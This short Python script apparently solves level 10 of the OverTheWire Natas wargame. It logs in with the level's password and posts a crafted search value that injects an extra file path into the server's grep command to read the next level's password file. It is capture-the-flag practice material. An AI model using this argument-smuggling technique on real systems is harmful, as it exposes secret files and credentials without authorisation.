import re
import requests

level = 10
creds = ('natas10','nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

formdata = {'needle':'.* /etc/natas_webpass/natas11 #','submit':'submit'}
response = session.post(url,auth=creds,data=formdata)
data = response.text
print(re.findall('/etc/natas_webpass/natas11:(.*)',data))